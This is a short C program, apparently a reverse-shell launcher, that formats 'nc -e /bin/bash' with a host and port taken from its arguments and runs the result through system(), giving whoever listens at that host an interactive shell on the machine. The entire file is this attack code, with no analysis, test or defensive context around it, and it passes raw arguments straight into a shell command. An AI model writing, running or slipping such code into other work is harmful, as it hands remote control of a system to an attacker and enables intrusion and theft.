#include<stdlib.h>
int main(int argc, char* argv[])
{
char shell_cmd[100];
sprintf(shell_cmd,"nc -e /bin/bash %s %s",argv[1],argv[2]);
system(shell_cmd);

}
